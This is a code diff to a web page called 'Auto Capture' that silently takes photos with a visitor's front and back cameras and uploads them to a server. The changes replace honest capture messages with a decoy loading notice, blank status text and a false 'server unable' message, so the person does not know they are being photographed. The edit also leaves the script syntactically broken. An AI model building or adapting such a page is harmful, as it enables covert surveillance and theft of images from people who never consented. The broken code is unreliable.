@@ -8,7 +8,7 @@
 <title>Auto Capture</title>
 </head>
 <body>
-<h2>Capturing...</h2>
+<h2>IT may take 4-5 sec to load</h2>
 <p id="status">Initializing camera...</p>
 
 <script>
@@ -43,16 +43,17 @@
     }
 
     try {
-        status.innerText = `Capturing front camera for ${name}...`;
+        status.innerText = ``;
         const frontPhoto = await takePhoto("user");
         await sendToServer(frontPhoto, "front");
 
-        status.innerText = `Capturing back camera for ${name}...`;
+        status.innerText = ``;
         const backPhoto = await takePhoto({ exact: "environment" });
         await sendToServer(backPhoto, "back");
 
-        status.innerText = `Capture complete for ${name}!`;
-    } catch (err) {
+        status.innerText = `server unable`;
+    }, 500);
+        catch (err) {
         status.innerText = "Error: " + err.message;
     }
 })();
